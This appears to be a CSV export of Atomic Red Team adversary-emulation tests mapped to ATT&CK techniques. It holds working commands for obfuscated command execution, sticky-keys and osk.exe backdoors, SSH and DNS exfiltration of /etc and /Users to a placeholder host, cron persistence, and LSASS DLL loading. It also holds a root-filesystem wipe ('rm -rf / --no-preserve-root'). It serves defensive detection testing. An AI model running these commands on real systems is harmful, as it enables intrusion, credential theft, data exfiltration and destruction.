",linux,,,"ENCODED=$(echo '#{message}' | b64encode -r -)
printf $ENCODED | b64decode -r
echo $ENCODED | b64decode -r
echo $(echo $ENCODED) | b64decode -r
echo $ENCODED > #{encoded_file} && b64encode -r #{encoded_file}
echo $ENCODED > #{encoded_file} && b64decode -r < #{encoded_file}
echo $ENCODED > #{encoded_file} && cat #{encoded_file} | b64decode -r
echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | b64decode -r
",sh,False,,,,,"input_arguments.message.description: Message to print to the screen

input_arguments.message.type: string

input_arguments.message.default: Hello from Atomic Red Team test T1140!

input_arguments.encoded_file.description: File to temporarily save encoded text

input_arguments.encoded_file.type: path

input_arguments.encoded_file.default: /tmp/T1140.encoded

"
T1140,Deobfuscate/Decode Files or Information,FreeBSD b64encode Shebang in CLI,18ee2002-66e8-4518-87c5-c0ec9c8299ac,"Using b64decode shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. 
",linux,,,"echo #{bash_encoded} | b64decode -r | sh
echo #{dash_encoded} | b64decode -r | sh
echo #{fish_encoded} | b64decode -r | sh
echo #{sh_encoded} | b64decode -r | sh
",sh,False,,,,"dependencies.0.description: b64decode must be present

dependencies.0.prereq_command: which b64decode

dependencies.0.get_prereq_command: echo ""please install b64decode""

","input_arguments.bash_encoded.description: Encoded

input_arguments.bash_encoded.type: string

input_arguments.bash_encoded.default: IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo=

input_arguments.dash_encoded.description: Encoded

input_arguments.dash_encoded.type: string

input_arguments.dash_encoded.default: IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo=

input_arguments.fish_encoded.description: Encoded

input_arguments.fish_encoded.type: string

input_arguments.fish_encoded.default: IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo=

input_arguments.sh_encoded.description: Encoded

input_arguments.sh_encoded.type: string

input_arguments.sh_encoded.default: IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK

"
T1140,Deobfuscate/Decode Files or Information,Hex decoding with shell utilities,005943f9-8dd5-4349-8b46-0313c0a9f973,"Use common shell utilities to decode a hex-encoded text string and echo it to the console
",linux,macos,,"ENCODED=$(echo '#{message}' | xxd -ps -c 256)
printf $ENCODED | xxd -r -p
echo $ENCODED | xxd -r -p
echo $(echo $ENCODED) | xxd -r -p
echo $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}
echo $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}
echo $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p
echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p
",sh,False,,,,"dependencies.0.description: xxd must be present

dependencies.0.prereq_command: which xxd

dependencies.0.get_prereq_command: echo ""Please install xxd""

","input_arguments.message.description: Message to print to the screen

input_arguments.message.type: string

input_arguments.message.default: Hello from Atomic Red Team test T1140!

input_arguments.encoded_file.description: File to temporarily save encoded text

input_arguments.encoded_file.type: path

input_arguments.encoded_file.default: /tmp/T1140.encoded

"
T1140,Deobfuscate/Decode Files or Information,Linux Base64 Encoded Shebang in CLI,3a15c372-67c1-4430-ac8e-ec06d641ce4d,"Using Linux Base64 Encoded shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. 
",linux,macos,,"echo #{bash_encoded} | base64 -d | bash
echo #{dash_encoded} | base64 -d | bash
echo #{fish_encoded} | base64 -d | bash
echo #{sh_encoded} | base64 -d | bash
",sh,False,,,,"dependencies.0.description: base64 must be present

dependencies.0.prereq_command: which base64

dependencies.0.get_prereq_command: echo ""please install base64""

","input_arguments.bash_encoded.description: Encoded

input_arguments.bash_encoded.type: string

input_arguments.bash_encoded.default: IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo=

input_arguments.dash_encoded.description: Encoded

input_arguments.dash_encoded.type: string

input_arguments.dash_encoded.default: IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo=

input_arguments.fish_encoded.description: Encoded

input_arguments.fish_encoded.type: string

input_arguments.fish_encoded.default: IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo=

input_arguments.sh_encoded.description: Encoded

input_arguments.sh_encoded.type: string

input_arguments.sh_encoded.default: IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK

"
T1140,Deobfuscate/Decode Files or Information,XOR decoding and command execution using Python,c3b65cd5-ee51-4e98-b6a3-6cbdec138efc,An adversary can obfuscate malicious commands or payloads using XOR and execute them on the victim's machine. This test uses Python to decode and execute commands on the machine.,linux,macos,,"python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: """".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = ""#{encrypted_command}""; key = ""#{xor_key}""; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'",bash,False,,,bash,"dependencies.0.description: Python3 must be installed
dependencies.0.prereq_command: which python3
dependencies.0.get_prereq_command: echo ""Install Python3""
","input_arguments.xor_key.description: Key used to decrypt the command 

input_arguments.xor_key.type: string

input_arguments.xor_key.default: waEHleblxiQjoxFJQaIMLdHKz

input_arguments.encrypted_command.description: Encrypted command that will be executed

input_arguments.encrypted_command.type: string

input_arguments.encrypted_command.default: AAkqKQEM

"
T1546.008,Event Triggered Execution: Accessibility Features,Attaches Command Prompt as a Debugger to a List of Target Processes,3309f53e-b22b-4eb6-8fd2-a6cf58b355a9,"Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.
Upon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.
",windows,,,"$input_table = ""#{parent_list}"".split("","")
$Name = ""Debugger""
$Value = ""#{attached_process}""
Foreach ($item in $input_table){
  $item = $item.trim()
  $registryPath = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item""
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}
",powershell,True,,"$input_table = ""#{parent_list}"".split("","")
Foreach ($item in $input_table)
{
  $item = $item.trim()
  reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"" /v Debugger /f 2>&1 | Out-Null
}
",,,"input_arguments.parent_list.description: Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: ""osk.exe""


input_arguments.parent_list.type: string

input_arguments.parent_list.default: osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe

input_arguments.attached_process.description: Full path to process to attach to target in #{parent_list}. Default: cmd.exe


input_arguments.attached_process.type: path

input_arguments.attached_process.default: C:\windows\system32\cmd.exe

"
T1546.008,Event Triggered Execution: Accessibility Features,Replace binary of sticky keys,934e90cf-29ca-48b3-863c-411737ad44e3,"Replace sticky keys binary (sethc.exe) with cmd.exe
",windows,,,"IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\sethc.exe /A
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
",command_prompt,True,,"copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
",,,
T1546.008,Event Triggered Execution: Accessibility Features,Create Symbolic Link From osk.exe to cmd.exe,51ef369c-5e87-4f33-88cd-6d61be63edf2,"Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.
",windows,,,"IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
takeown /F %windir%\System32\osk.exe /A
icacls %windir%\System32\osk.exe /grant Administrators:F /t
del %windir%\System32\osk.exe
mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
",command_prompt,True,,"takeown /F %windir%\System32\osk.exe /A
icacls %windir%\System32\osk.exe /grant Administrators:F /t
del %windir%\System32\osk.exe
copy /Y %windir%\System32\osk.exe.bak %windir%\System32\osk.exe
icacls %windir%\system32\osk.exe /inheritance:d
icacls %windir%\system32\osk.exe /setowner ""NT SERVICE\TrustedInstaller""
icacls %windir%\System32\osk.exe /grant ""NT SERVICE\TrustedInstaller"":F /t
icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
icacls %windir%\system32\osk.exe /grant:r Administrators:RX
",,,
T1546.008,Event Triggered Execution: Accessibility Features,Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,444ff124-4c83-4e28-8df6-6efd3ece6bd4,"Executes code specified in the registry for a new AT (Assistive Technologies).
",windows,,,"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test""
reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0
reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe
atbroker /start malware_test
",command_prompt,,,"reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test""
",,,
T1048,Exfiltration Over Alternative Protocol,Exfiltration Over Alternative Protocol - SSH,f6786cc8-beda-4915-a4d6-ac2f193bb988,"Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
",macos,linux,,"ssh #{domain} ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz
",sh,,,,,,"input_arguments.domain.description: target SSH domain

input_arguments.domain.type: url

input_arguments.domain.default: target.example.com

"
T1048,Exfiltration Over Alternative Protocol,Exfiltration Over Alternative Protocol - SSH,7c3cb337-35ae-4d06-bf03-3032ed2ec268,"Input a domain and test Exfiltration over SSH

Local to Remote

Upon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.
",macos,linux,,"tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
",sh,,,,,,"input_arguments.user_name.description: username for domain

input_arguments.user_name.type: string

input_arguments.user_name.default: atomic

input_arguments.password.description: password for user

input_arguments.password.type: string

input_arguments.password.default: atomic

input_arguments.domain.description: target SSH domain

input_arguments.domain.type: url

input_arguments.domain.default: target.example.com

"
T1048,Exfiltration Over Alternative Protocol,DNSExfiltration (doh),c943d285-ada3-45ca-b3aa-7cd6500c6a48,"DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.
!!! Test will fail without a domain under your control with A record and NS record !!! 
See this github page for more details - https://github.com/Arno0x/DNSExfiltrator
",windows,,,"Import-Module ""#{ps_module}""
Invoke-DNSExfiltrator -i ""#{ps_module}"" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
",powershell,,,,powershell,"dependencies.0.description: DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})

dependencies.0.prereq_command: if (Test-Path ""#{ps_module}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
IWR ""https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1"" -OutFile ""#{ps_module}""

","input_arguments.password.description: Password used to encrypt the data to be exfiltrated

input_arguments.password.type: string

input_arguments.password.default: atomic

input_arguments.domain.description: The domain name to use for DNS requests

input_arguments.domain.type: string

input_arguments.domain.default: target.example.com

input_arguments.ps_module.description: DNSExfiltrator powershell ps_module

input_arguments.ps_module.type: path

input_arguments.ps_module.default: PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1

input_arguments.doh.description: Google or CloudFlare DoH (DNS over HTTP) server

input_arguments.doh.type: string

input_arguments.doh.default: google

input_arguments.time.description: The time in milliseconds to wait between each DNS request

input_arguments.time.type: string

input_arguments.time.default: 500

input_arguments.encoding.description: Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.

input_arguments.encoding.type: string

input_arguments.encoding.default: None

"
T1221,Template Injection,WINWORD Remote Template Injection,1489e08a-82c7-44ee-b769-51b72d03521d,"Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm 
Executes the code specified within the .dotm template.
Requires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  
Default docs file opens Calculator.exe when test sucessfully executed, while AV turned off.
",windows,,,"start ""#{docx_file}""
",command_prompt,,,,,,"input_arguments.docx_file.description: Location of the test docx file on the local filesystem.

input_arguments.docx_file.type: path

input_arguments.docx_file.default: PathToAtomicsFolder\T1221\src\Calculator.docx

"
T1070.004,Indicator Removal on Host: File Deletion,Delete a single file - FreeBSD/Linux/macOS,562d737f-2fc6-4b09-8c2a-7f8ff0828480,"Delete a single file from the temporary directory
",linux,macos,,"rm -f #{file_to_delete}
",sh,,,"rm -rf #{parent_folder}
",sh,"dependencies.0.description: The file must exist in order to be deleted

dependencies.0.prereq_command: test -e #{file_to_delete} && exit 0 || exit 1

dependencies.0.get_prereq_command: mkdir -p #{parent_folder} && touch #{file_to_delete}

","input_arguments.parent_folder.description: Path of parent folder

input_arguments.parent_folder.type: path

input_arguments.parent_folder.default: /tmp/victim-files/

input_arguments.file_to_delete.description: Path of file to delete

input_arguments.file_to_delete.type: path

input_arguments.file_to_delete.default: /tmp/victim-files/T1070.004-test.txt

"
T1070.004,Indicator Removal on Host: File Deletion,Delete an entire folder - FreeBSD/Linux/macOS,a415f17e-ce8d-4ce2-a8b4-83b674e7017e,"Recursively delete the temporary directory and all files contained within it
",linux,macos,,"rm -rf #{folder_to_delete}
",sh,,,,sh,"dependencies.0.description: The folder must exist in order to be deleted

dependencies.0.prereq_command: test -e #{folder_to_delete} && exit 0 || exit 1

dependencies.0.get_prereq_command: mkdir -p #{folder_to_delete}

","input_arguments.folder_to_delete.description: Path of folder to delete

input_arguments.folder_to_delete.type: path

input_arguments.folder_to_delete.default: /tmp/victim-folder

"
T1070.004,Indicator Removal on Host: File Deletion,Overwrite and delete a file with shred,039b4b10-2900-404b-b67f-4b6d49aa6499,"Use the `shred` command to overwrite the temporary file and then delete it
",linux,,,"shred -u #{file_to_shred}
",sh,,,,,,"input_arguments.file_to_shred.description: Path of file to shred

input_arguments.file_to_shred.type: path

input_arguments.file_to_shred.default: /tmp/victim-shred.txt

"
T1070.004,Indicator Removal on Host: File Deletion,Delete a single file - Windows cmd,861ea0b4-708a-4d17-848d-186c9c7f17e3,"Delete a single file from the temporary directory using cmd.exe.
Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.
",windows,,,"del /f #{file_to_delete}
",command_prompt,,,,command_prompt,"dependencies.0.description: The file to delete must exist on disk at specified location (#{file_to_delete})

dependencies.0.prereq_command: IF EXIST ""#{file_to_delete}"" ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: echo deleteme_T1551.004 >> #{file_to_delete}

","input_arguments.file_to_delete.description: File to delete. Run the prereq command to create it if it does not exist.

input_arguments.file_to_delete.type: string

input_arguments.file_to_delete.default: %temp%\deleteme_T1551.004

"
T1070.004,Indicator Removal on Host: File Deletion,Delete an entire folder - Windows cmd,ded937c4-2add-42f7-9c2c-c742b7a98698,"Recursively delete a folder in the temporary directory using cmd.exe.
Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.
",windows,,,"rmdir /s /q #{folder_to_delete}
",command_prompt,,,,command_prompt,"dependencies.0.description: The file to delete must exist on disk at specified location (#{folder_to_delete})

dependencies.0.prereq_command: IF EXIST ""#{folder_to_delete}"" ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: mkdir #{folder_to_delete}

","input_arguments.folder_to_delete.description: Folder to delete. Run the prereq command to create it if it does not exist.

input_arguments.folder_to_delete.type: string

input_arguments.folder_to_delete.default: %temp%\deleteme_T1551.004

"
T1070.004,Indicator Removal on Host: File Deletion,Delete a single file - Windows PowerShell,9dee89bd-9a98-4c4f-9e2d-4256690b0e72,"Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.
",windows,,,"Remove-Item -path #{file_to_delete}
",powershell,,,,powershell,"dependencies.0.description: The file to delete must exist on disk at specified location (#{file_to_delete})

dependencies.0.prereq_command: if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Path #{file_to_delete} | Out-Null

","input_arguments.file_to_delete.description: File to delete. Run the prereq command to create it if it does not exist.

input_arguments.file_to_delete.type: string

input_arguments.file_to_delete.default: $env:TEMP\deleteme_T1551.004

"
T1070.004,Indicator Removal on Host: File Deletion,Delete an entire folder - Windows PowerShell,edd779e4-a509-4cba-8dfa-a112543dbfb1,"Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.
",windows,,,"Remove-Item -Path #{folder_to_delete} -Recurse
",powershell,,,,powershell,"dependencies.0.description: The folder to delete must exist on disk at specified location (#{folder_to_delete})

dependencies.0.prereq_command: if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Path #{folder_to_delete} -Type Directory | Out-Null

","input_arguments.folder_to_delete.description: Folder to delete. Run the prereq command to create it if it does not exist.

input_arguments.folder_to_delete.type: string

input_arguments.folder_to_delete.default: $env:TEMP\deleteme_folder_T1551.004

"
T1070.004,Indicator Removal on Host: File Deletion,Delete Filesystem - Linux,f3aa95fe-4f10-4485-ad26-abf22a764c52,"This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.
",linux,,,"[ ""$(uname)"" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
",sh,,,,,,
T1070.004,Indicator Removal on Host: File Deletion,Delete Prefetch File,36f96049-0ad7-4a5f-8418-460acaeb92fb,"Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run ""(Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" | Measure-Object).Count""
before and after the test to verify that the number of prefetch files decreases by 1.
",windows,,,"Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])
",powershell,True,,,,,
T1070.004,Indicator Removal on Host: File Deletion,Delete TeamViewer Log Files,69f50a5f-967c-4327-a5bb-e1a9a9983785,"Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.
This test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer
log file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.

https://twitter.com/SBousseaden/status/1197524463304290305?s=20
",windows,,,"New-Item -Path #{teamviewer_log_file} -Force | Out-Null
Remove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore
",powershell,,,,,,"input_arguments.teamviewer_log_file.description: Teamviewer log file to create and delete.

input_arguments.teamviewer_log_file.type: string

input_arguments.teamviewer_log_file.default: $env:TEMP\TeamViewer_54.log

"
T1053.003,Scheduled Task/Job: Cron,Cron - Replace crontab with referenced file,435057fb-74b1-410e-9403-d81baf194f75,"This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.
",linux,macos,,"crontab -l > /tmp/notevil
echo ""* * * * * #{command}"" > #{tmp_cron} && crontab #{tmp_cron}
",sh,,,"crontab /tmp/notevil
",,,"input_arguments.command.description: Command to execute

input_arguments.command.type: string

input_arguments.command.default: /tmp/evil.sh

input_arguments.tmp_cron.description: Temporary reference file to hold evil cron schedule

input_arguments.tmp_cron.type: path

input_arguments.tmp_cron.default: /tmp/persistevil

"
T1053.003,Scheduled Task/Job: Cron,Cron - Add script to all cron subfolders,b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0,"This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
",macos,linux,,"echo ""#{command}"" > /etc/cron.daily/#{cron_script_name}
echo ""#{command}"" > /etc/cron.hourly/#{cron_script_name}
echo ""#{command}"" > /etc/cron.monthly/#{cron_script_name}
echo ""#{command}"" > /etc/cron.weekly/#{cron_script_name}
",bash,True,,"rm /etc/cron.daily/#{cron_script_name}
rm /etc/cron.hourly/#{cron_script_name}
rm /etc/cron.monthly/#{cron_script_name}
rm /etc/cron.weekly/#{cron_script_name}
",,,"input_arguments.command.description: Command to execute

input_arguments.command.type: string

input_arguments.command.default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log

input_arguments.cron_script_name.description: Name of file to store in cron folder

input_arguments.cron_script_name.type: string

input_arguments.cron_script_name.default: persistevil

"
T1053.003,Scheduled Task/Job: Cron,Cron - Add script to /etc/cron.d folder,078e69eb-d9fb-450e-b9d0-2e118217c846,"This test adds a script to /etc/cron.d folder configured to execute on a schedule.
",linux,,,"echo ""#{command}"" > /etc/cron.d/#{cron_script_name}
",sh,True,,"rm /etc/cron.d/#{cron_script_name}
",,,"input_arguments.command.description: Command to execute

input_arguments.command.type: string

input_arguments.command.default: echo '*/5     *       *       *       *       root    echo ""Hello from Atomic Red Team""' > /tmp/atomic.log

input_arguments.cron_script_name.description: Name of file to store in cron folder

input_arguments.cron_script_name.type: string

input_arguments.cron_script_name.default: persistevil

"
T1053.003,Scheduled Task/Job: Cron,Cron - Add script to /var/spool/cron/crontabs/ folder,2d943c18-e74a-44bf-936f-25ade6cccab4,"This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
",linux,,,"echo ""#{command}"" >> /var/spool/cron/crontabs/#{cron_script_name}
",bash,True,,"rm /var/spool/cron/crontabs/#{cron_script_name}
",,,"input_arguments.command.description: Command to execute

input_arguments.command.type: string

input_arguments.command.default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log

input_arguments.cron_script_name.description: Name of file to store in /var/spool/cron/crontabs folder

input_arguments.cron_script_name.type: string

input_arguments.cron_script_name.default: persistevil

"
T1547.008,Boot or Logon Autostart Execution: LSASS Driver,Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt,8ecef16d-d289-46b4-917b-0dba6dc81cf1,"The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. 

Upon execution, the registry key will be modified and a value will contain the path to the DLL. 
Reference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal
Note that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.
",windows,,,"New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value ""#{dll_path}""
",powershell,True,,"Remove-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\NTDS"" -Name ""LsaDbExtPt"" -ErrorAction Ignore | Out-Null
",powershell,"dependencies.0.description: lsass_lib.dll must exist on disk at specified location (#{dll_path})

dependencies.0.prereq_command: if (Test-Path ""#{dll_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll"" -UseBasicParsing -OutFile ""#{dll_path}""

","input_arguments.dll_path.description: Module to be loaded into LSASS

input_arguments.dll_path.type: path

input_arguments.dll_path.default: PathToAtomicsFolder\..\ExternalPayloads\lsass_lib.dll

"
T1053.002,Scheduled Task/Job: At,At.exe Scheduled task,4a6c0dc4-0f2a-4203-9298-a5a9bdc21ed8,"Executes cmd.exe
Note: deprecated in Windows 8+

Upon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.
",windows,,,"at 13:20 /interactive cmd
",command_prompt,False,,,,,
T1053.002,Scheduled Task/Job: At,At - Schedule a job,7266d898-ac82-4ec0-97c7-436075d0d08e,"This test submits a command to be run in the future by the `at` daemon.
",linux,,,"echo ""#{at_command}"" | at #{time_spec}",sh,False,,,sh,"dependencies.0.description: The `at` and `atd` executables must exist in the PATH

dependencies.0.prereq_command: if [ ""$(uname)"" = 'FreeBSD' ]; then which at; else which at && which atd; fi;

dependencies.0.get_prereq_command: echo 'Please install `at` and `atd`; they were not found in the PATH (Package name: `at`)'

dependencies.1.description: The `atd` daemon must be running

dependencies.1.prereq_command: if [ $(uname) = 'Linux' ]; then systemctl status atd || service atd status; fi;

dependencies.1.get_prereq_command: echo 'Please start the `atd` daemon (sysv: `service atd start` ; systemd: `systemctl start atd`)'

","input_arguments.time_spec.description: Time specification of when the command should run

input_arguments.time_spec.type: string

input_arguments.time_spec.default: now + 1 minute

input_arguments.at_command.description: The command to be run

input_arguments.at_command.type: string

input_arguments.at_command.default: echo Hello from Atomic Red Team

"
T1134.004,Access Token Manipulation: Parent PID Spoofing,Parent PID Spoofing using PowerShell,069258f4-2162-46e9-9a25-c9c6c56150d2,"This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.
Upon execution, ""Process C:\Program Files\Internet Explorer\iexplore.exe is spawned with pid ####"" will be displayed and
calc.exe will be launched.

Credit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)
",windows,,,". ""$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1""
$ppid=Get-Process #{parent_process_name} | select -expand id
PPID-Spoof -ppid $ppid -spawnto ""#{spawnto_process_path}"" -dllpath ""#{dll_path}""
",powershell,,,"Stop-Process -Name ""#{dll_process_name}"" -ErrorAction Ignore
Stop-Process -Name ""#{spawnto_process_name}"" -ErrorAction Ignore
",powershell,"dependencies.0.description: DLL to inject must exist on disk at specified location (#{dll_path})

dependencies.0.prereq_command: if (Test-Path ""#{dll_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll"" -OutFile ""#{dll_path}""

dependencies.1.description: PPID.ps1 must exist on disk at $PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1

dependencies.1.prereq_command: if (Test-Path ""$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory (split-path ""$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134.004/src/PPID-Spoof.ps1"" -OutFile ""$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1""

","input_arguments.parent_process_name.description: Name of the parent process

input_arguments.parent_process_name.type: string

input_arguments.parent_process_name.default: explorer

input_arguments.spawnto_process_path.description: Path of the process to spawn

input_arguments.spawnto_process_path.type: path

input_arguments.spawnto_process_path.default: C:\Program Files\Internet Explorer\iexplore.exe

input_arguments.dll_process_name.description: Name of the created process from the injected dll

input_arguments.dll_process_name.type: string

input_arguments.dll_process_name.default: calculator

input_arguments.dll_path.description: Path of the dll to inject

input_arguments.dll_path.type: path

input_arguments.dll_path.default: PathToAtomicsFolder\T1134.004\bin\calc.dll

input_arguments.spawnto_process_name.description: Name of the process to spawn

input_arguments.spawnto_process_name.type: string

input_arguments.spawnto_process_name.default: iexplore

"
